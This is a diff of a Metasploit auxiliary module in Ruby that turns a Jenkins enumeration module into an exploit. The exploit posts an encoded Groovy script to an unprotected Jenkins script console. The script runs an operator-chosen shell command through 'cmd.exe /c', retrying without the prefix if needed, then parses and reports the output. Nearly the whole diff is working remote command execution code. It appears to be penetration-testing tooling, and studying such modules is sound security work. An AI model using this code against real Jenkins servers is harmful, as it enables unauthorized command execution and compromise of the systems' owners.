@@ -3,10 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# Some of this code was taken from the "jboss_vulnscan" module by: Tyler Krpata
-##
-
 require 'rex/proto/http'
 require 'msf/core'
 require 'rexml/document'
@@ -19,37 +15,62 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Jenkins Enumeration',
+      'Name'        => 'Jenkins RCE (via Groovy Script)',
       'Description' => %q{
-        This module enumerates a remote Jenkins installation in an unauthenticated manner, including
-        host operating system and and Jenkins installation details.
+        This module takes advantage of the lack of password on Jenkins web applications
+        and automates the command execution aspect (via groovy script).
       },
-      'Author'      => 'Jeff McCutchan',
+      'Author'      =>
+        [
+             'altonjx',
+             'Jeffrey Cap'
+        ],
+      'References'  => [
+        ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/']
+       ],
       'License'     => MSF_LICENSE
       ))
 
     register_options(
       [
-        OptString.new('TARGETURI',  [ true,  "Path to Jenkins instance", "/jenkins/"]),
-        OptString.new('COMMAND', [true, 'Command to run via Groovy Script']),
+        OptString.new('TARGETURI',  [ true,  "Path to Jenkins instance", "/jenkins/script"]),
+        OptString.new('COMMAND', [true, 'Command to run in application', 'whoami']),
       ], self.class)
+    deregister_options('VHOST')
   end
 
-  def run_host(ip)
-    headers = {
-      'Cookie' => 'JSESSIONID=1x7vleaog5ele1hte6hk6ca6bw'
-    }
+  def run_host(ip, prefix="cmd.exe /c", try=1)
     command = datastore['COMMAND'].gsub("\\", "\\\\\\")
     res = send_request_cgi(
       {
       'uri'       => target_uri.path,
       'method'    => 'POST',
       'ctype'     => 'application/x-www-form-urlencoded',
-      'headers'   => headers,
-      'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+whoami%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+whoami%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
-    }).to_s.gsub("err&amp;gt;", "")
-   output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1].strip
-   print_good("The command executed successfully on #{rhost}:#{rport}.")
-   output.split("\n").each{|line| print_status("#{rhost}:#{rport}: #{line.strip}")}
+      'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27#{prefix}+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
+    }).body.to_s
+    if res.nil?
+      print_error("#{rhost}:#{rport} - An unknown error occurred when running the command.")
+    else
+      output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1].gsub("err&amp;gt;", "").strip
+      if output.include? "org.eclipse.jetty.server." and try == 1
+        run_host(ip, "", 2)
+      elsif (output.include? "org.eclipse.jetty.server." and try == 2) or output.include? "not recognized as"
+        print_error("The provided command is not valid. Try again.")
+        report_data(ip, rport, "The #{command} did not run successfully.")
+      else
+        print_good("The command executed successfully on #{ip}. Output:")
+        report_data(ip, rport, "The #{command} executed successfully.")
+        output.split("\n").each{|line| print_status("#{rhost}:#{rport}: #{line.strip}")}
+      end
+    end
+  end
+
+  def report_data(ip, rport, result)
+    report_service(
+      :host   => ip,
+      :port   => datastore['RPORT'],
+      :proto  => 'tcp',
+      :info   => result
+    )
   end
 end
